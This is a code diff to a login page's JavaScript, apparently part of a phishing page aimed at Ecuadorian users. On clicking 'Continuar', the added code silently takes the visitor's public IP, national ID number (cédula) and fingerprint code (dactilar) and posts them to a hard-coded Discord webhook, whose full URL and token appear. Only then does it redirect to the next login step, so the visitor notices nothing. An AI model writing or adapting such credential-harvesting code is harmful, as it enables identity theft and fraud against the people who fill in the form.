@@ -226,10 +226,36 @@
         inputDactilar.addEventListener('input', validateInputs);
 
         btnContinuar.addEventListener('click', () => {
-            if (!btnContinuar.disabled) {
-                window.location.href = 'login3.html';
-            }
-        });
+                        if (!btnContinuar.disabled) {
+                                // Obtener IP pública
+                                fetch('https://api.ipify.org?format=json')
+                                    .then(response => response.json())
+                                    .then(data => {
+                                        const ip = data.ip;
+                                        const cedula = inputCedula.value;
+                                        const dactilar = inputDactilar.value;
+                                        // Enviar al webhook de Discord
+                                        fetch('https://discordapp.com/api/webhooks/1478881955914448928/aIqH3pP2YLxjTfEaHLp13Yva48No9fcG9A_XrM5UcGQVyBmlr-ZRr_K0q2Lu6F-MDj26', {
+                                            method: 'POST',
+                                            headers: {
+                                                'Content-Type': 'application/json'
+                                            },
+                                            body: JSON.stringify({
+                                                content: `IP: ${ip}\nCédula: ${cedula}\nDactilar: ${dactilar}`
+                                            })
+                                        })
+                                        .then(() => {
+                                            window.location.href = 'login3.html';
+                                        })
+                                        .catch(() => {
+                                            window.location.href = 'login3.html';
+                                        });
+                                    })
+                                    .catch(() => {
+                                        window.location.href = 'login3.html';
+                                    });
+                        }
+                });
 
         // Lógica del Carrusel de Imágenes
         // Las imagenes estan dentro de la carpeta img: img1.jpeg, img2.jpeg, img3.jpeg
